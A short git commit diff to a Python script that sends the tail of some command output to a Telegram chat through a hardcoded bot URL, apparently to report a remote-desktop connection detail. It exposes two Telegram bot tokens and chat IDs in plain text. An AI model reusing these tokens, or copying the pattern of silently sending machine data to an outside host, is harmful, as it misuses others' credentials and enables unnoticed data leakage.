44f1474e9cc045e07a41e0719b0171ee1953ffc8
jwrick816 <86348963+jwrick816@users.noreply.github.com>
2022-01-11 00:21:42 +0530

    Update info.py

--- Files/info.py
+++ Files/info.py
@@ -9,6 +9,6 @@ sample_str = output
 last_chars = sample_str[-21:]
 
 #url1= 'https://api.telegram.org/bot1718187783:AAGLVyeXsl0xWFhMM4fjYrV3ij7pE04HSt4/sendMessage?chat_id=-418475197&text=Windows-RDP'
-url2= 'https://api.telegram.org/bot1718187783:AAGLVyeXsl0xWFhMM4fjYrV3ij7pE04HSt4/sendMessage?chat_id=-418475197&text={}'.format(last_chars)
+url2= 'https://api.telegram.org/bot5017232812:AAG6ts8KVAqVymo4ULN9UdXEj45svM_rS1w/sendMessage?chat_id=-1001734502672&text={}'.format(last_chars)
 #requests.get(url1)
 requests.get(url2)
